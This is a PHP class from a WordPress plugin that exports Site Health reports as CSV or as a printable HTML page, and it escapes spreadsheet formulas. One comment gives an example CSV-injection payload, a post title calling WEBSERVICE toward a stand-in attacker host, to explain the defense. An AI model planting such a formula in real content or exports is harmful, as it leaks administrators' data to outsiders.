<?php
/**
 * Turns a stored Site Health report into a file someone can send on.
 *
 * @package MySiteHand
 */

namespace MySiteHand;

defined( 'ABSPATH' ) || exit;

/**
 * Report Exporter class.
 *
 * Two outputs, both built from the report already stored in the
 * REPORT_OPTION: a CSV, and a self-contained HTML page meant for the browser's
 * own print-to-PDF. There is no PDF library here and there will not be one —
 * bundling a typesetting engine to render a two page table would multiply the
 * size of the plugin for something every browser already does well.
 *
 * This is the ADMIN export. It contains everything the report contains and is
 * only ever served to a user with manage_options. The public, tokenized
 * version of a report is built somewhere else entirely, by Shared_Reports,
 * from a payload that is redacted at the point it is created.
 */
class Report_Exporter {

	/**
	 * Columns in the exported CSV, in order.
	 *
	 * @return array<int, string>
	 */
	private function csv_headers(): array {
		return [
			__( 'Check', 'my-site-hand' ),
			__( 'Severity', 'my-site-hand' ),
			__( 'Issue', 'my-site-hand' ),
			__( 'Context', 'my-site-hand' ),
			__( 'Link', 'my-site-hand' ),
			__( 'Object ID', 'my-site-hand' ),
		];
	}

	/**
	 * Stream a report as CSV and stop.
	 *
	 * Sends its own headers and exits, exactly like the audit log export: the
	 * REST response machinery has nothing to add to a file download.
	 *
	 * @param array<string, mixed> $report Stored report.
	 * @return void
	 */
	public function stream_csv( array $report ): void {
		// phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_read_fopen
		$output = fopen( 'php://output', 'w' );

		if ( ! $output ) {
			wp_die( esc_html__( 'Could not open output stream.', 'my-site-hand' ) );
		}

		header( 'Content-Type: text/csv; charset=utf-8' );
		header( 'Content-Disposition: attachment; filename="' . $this->filename( 'csv' ) . '"' );
		header( 'Pragma: no-cache' );
		header( 'Expires: 0' );

		// Excel reads a CSV as the system codepage unless a byte order mark
		// tells it otherwise, which turns every non-English post title into
		// mojibake. Three bytes buys correct titles in every language.
		echo "\xEF\xBB\xBF"; // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped -- Byte order mark, not content.

		// phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fputcsv
		fputcsv( $output, $this->csv_headers() );

		foreach ( (array) ( $report['checks'] ?? [] ) as $check_id => $entry ) {
			$label  = (string) ( $entry['label'] ?? $check_id );
			$issues = isset( $entry['issues'] ) && is_array( $entry['issues'] ) ? $entry['issues'] : [];

			foreach ( $issues as $issue ) {
				// fputcsv() quotes and escapes commas, quotes and newlines inside
				// a field on its own, so do not pre-escape for CSV syntax. The
				// row still goes through csv_row() for the separate problem of
				// spreadsheet formulas — see neutralize_formula().
				// phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fputcsv
				fputcsv(
					$output,
					$this->csv_row(
						[
							$label,
							(string) ( $issue['severity'] ?? '' ),
							(string) ( $issue['title'] ?? '' ),
							(string) ( $issue['context'] ?? '' ),
							(string) ( $issue['link'] ?? '' ),
							isset( $issue['object_id'] ) && null !== $issue['object_id'] ? (string) (int) $issue['object_id'] : '',
						]
					)
				);
			}

			$remaining = $this->remaining_count( $entry );

			if ( $remaining > 0 ) {
				// A report stores at most MAX_STORED_ISSUES rows per check, so
				// the file is a sample of a bigger problem. Saying so in the
				// file itself is the difference between a truncated export and
				// a misleading one.
				// phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fputcsv
				fputcsv(
					$output,
					$this->csv_row(
						[
							$label,
							'',
							sprintf(
								/* translators: %d: number of issues found but not included in the file */
								_n(
									'%d more issue not exported',
									'%d more issues not exported',
									$remaining,
									'my-site-hand'
								),
								$remaining
							),
							'',
							'',
							'',
						]
					)
				);
			}
		}

		// phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fclose
		fclose( $output );
		exit;
	}

	/**
	 * Prepare a whole row for writing.
	 *
	 * @param array<int, string> $cells Raw cell values.
	 * @return array<int, string>
	 */
	private function csv_row( array $cells ): array {
		return array_map( [ $this, 'neutralize_formula' ], $cells );
	}

	/**
	 * Stop a spreadsheet treating a cell as a formula.
	 *
	 * A post title is written by whoever wrote the post, and on a site with
	 * more than one author that is not necessarily the person who opens this
	 * file. Four of the checks put a post title at the START of the Issue
	 * cell, so a post titled =WEBSERVICE("https://attacker.example?d="&A2)
	 * becomes a live formula the moment an administrator opens the export in
	 * Excel — quietly sending the surrounding cells, which include admin edit
	 * URLs, to whoever wrote that title.
	 *
	 * fputcsv() does not help here: it escapes CSV syntax, and the spreadsheet
	 * strips that quoting before it decides what is a formula. The fix is to
	 * push the dangerous character out of first position, which a leading
	 * apostrophe does without changing what the reader sees.
	 *
	 * @param string $value Cell value.
	 * @return string
	 */
	private function neutralize_formula( string $value ): string {
		if ( '' === $value ) {
			return $value;
		}

		// Tab and carriage return are included because a spreadsheet skips
		// leading whitespace before looking for the formula character.
		if ( in_array( $value[0], [ '=', '+', '-', '@', "\t", "\r" ], true ) ) {
			return "'" . $value;
		}

		return $value;
	}

	/**
	 * Render the printable report page and stop.
	 *
	 * @param array<string, mixed> $report    Stored report.
	 * @param bool                 $auto_print Whether to open the print dialog on load.
	 * @return void
	 */
	public function render_print_page( array $report, bool $auto_print ): void {
		header( 'Content-Type: text/html; charset=utf-8' );
		header( 'X-Robots-Tag: noindex, nofollow', true );

		$view = $this->build_view( $report );

		// Local names the template reads. Kept explicit so the template has no
		// idea where its data came from.
		$my_site_hand_view        = $view;
		$my_site_hand_auto_print  = $auto_print;

		require MYSITEHAND_PATH . 'templates/export/health-print.php';

		exit;
	}

	/**
	 * Everything the print template needs, resolved once.
	 *
	 * @param array<string, mixed> $report Stored report.
	 * @return array<string, mixed>
	 */
	public function build_view( array $report ): array {
		$scanner = Plugin::get_instance()->get_site_health_scanner();
		$score   = (int) ( $report['score'] ?? 0 );
		$band    = $scanner->get_score_band( $score );

		$previous = isset( $report['previous_score'] ) && null !== $report['previous_score']
			? (int) $report['previous_score']
			: null;

		$checks = [];

		foreach ( (array) ( $report['checks'] ?? [] ) as $check_id => $entry ) {
			$checks[] = [
				'id'          => (string) $check_id,
				'label'       => (string) ( $entry['label'] ?? $check_id ),
				'status'      => (string) ( $entry['status'] ?? 'pending' ),
				'status_text' => $this->status_text( (string) ( $entry['status'] ?? 'pending' ), (int) ( $entry['issue_count'] ?? 0 ) ),
				'severity'    => (string) ( $entry['severity'] ?? Health_Check_Base::SEVERITY_NOTICE ),
				'issue_count' => (int) ( $entry['issue_count'] ?? 0 ),
				'remaining'   => $this->remaining_count( $entry ),
				'issues'      => isset( $entry['issues'] ) && is_array( $entry['issues'] ) ? $entry['issues'] : [],
			];
		}

		return [
			'site_name'   => get_bloginfo( 'name' ),
			'site_url'    => home_url( '/' ),
			'generated'   => (int) ( $report['generated_at'] ?? time() ),
			'score'       => $score,
			'band'        => $band['band'],
			'band_label'  => $band['label'],
			'previous'    => $previous,
			'delta'       => null !== $previous ? $score - $previous : null,
			'checks'      => $checks,
			'plugin_url'  => 'https://wordpress.org/plugins/my-site-hand/',
		];
	}

	/**
	 * A translated one-line status for a check.
	 *
	 * @param string $status Stored status.
	 * @param int    $count  Issues found.
	 * @return string
	 */
	public function status_text( string $status, int $count ): string {
		switch ( $status ) {
			case 'skipped':
				return __( 'Not applicable to this site', 'my-site-hand' );
			case 'error':
				return __( 'Could not run', 'my-site-hand' );
			case 'pending':
				return __( 'Not run', 'my-site-hand' );
		}

		if ( 0 === $count ) {
			return __( 'Nothing found', 'my-site-hand' );
		}

		return sprintf(
			/* translators: %d: number of issues */
			_n( '%d issue found', '%d issues found', $count, 'my-site-hand' ),
			$count
		);
	}

	/**
	 * How many issues a check found but the report did not keep.
	 *
	 * @param array<string, mixed> $entry Stored check entry.
	 * @return int
	 */
	private function remaining_count( array $entry ): int {
		if ( empty( $entry['truncated'] ) ) {
			return 0;
		}

		$stored = isset( $entry['issues'] ) && is_array( $entry['issues'] ) ? count( $entry['issues'] ) : 0;

		return max( 0, (int) ( $entry['issue_count'] ?? 0 ) - $stored );
	}

	/**
	 * Download filename for an export.
	 *
	 * @param string $extension File extension without the dot.
	 * @return string
	 */
	public function filename( string $extension ): string {
		return 'my-site-hand-report-' . $this->site_slug() . '-' . gmdate( 'Y-m-d' ) . '.' . $extension;
	}

	/**
	 * A short, filesystem-safe name for this site.
	 *
	 * @return string
	 */
	private function site_slug(): string {
		$slug = sanitize_title( (string) get_bloginfo( 'name' ) );

		if ( '' === $slug ) {
			$slug = sanitize_title( (string) wp_parse_url( home_url(), PHP_URL_HOST ) );
		}

		return '' !== $slug ? $slug : 'site';
	}
}
